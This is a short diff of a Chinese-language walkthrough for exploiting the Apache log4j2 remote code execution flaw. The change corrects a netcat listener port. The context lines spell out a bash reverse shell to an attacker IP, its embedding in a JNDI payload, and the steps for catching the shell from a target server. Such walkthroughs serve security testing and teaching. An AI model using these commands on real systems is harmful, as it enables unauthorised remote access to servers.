@@ -29,7 +29,7 @@ Apache log4j2 开源日志组件远程代码执行
     1. 命令说明：-C  指定要执行的命令，-A 指定监听端口所在IP（一般为本机IP）
     2. base64 编码部分为Linux 反弹shell  `bash -i > /dev/tcp/192.168.99.44/8888 0>&1`
     3. 将利用工具生成的jndi links 放入postman payload 中
-3. 本地开启nc 监听 `nc -Lvvp 888`
+3. 本地开启nc 监听 `nc -Lvvp 8888`
 4. 发送payload 到目标服务器，反弹shell 成功
 5. 利用过程截图: ![利用结果](./shell/shell.png)、![服务器端输出](./shell/output.png)
 
